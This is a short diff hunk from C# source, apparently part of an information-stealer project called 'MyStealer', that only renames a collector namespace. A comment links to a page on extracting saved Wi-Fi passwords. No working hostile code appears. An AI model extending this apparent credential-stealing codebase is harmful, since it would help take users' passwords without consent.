@@ -7,7 +7,7 @@ using System.Security.Cryptography;
 using System.Text;
 using System.Xml.Linq;
 
-namespace MyStealer.Collector.System
+namespace MyStealer.Collector.SysInfo
 {
     /// <summary>
     /// https://securityxploded.com/wifi-password-secrets.php
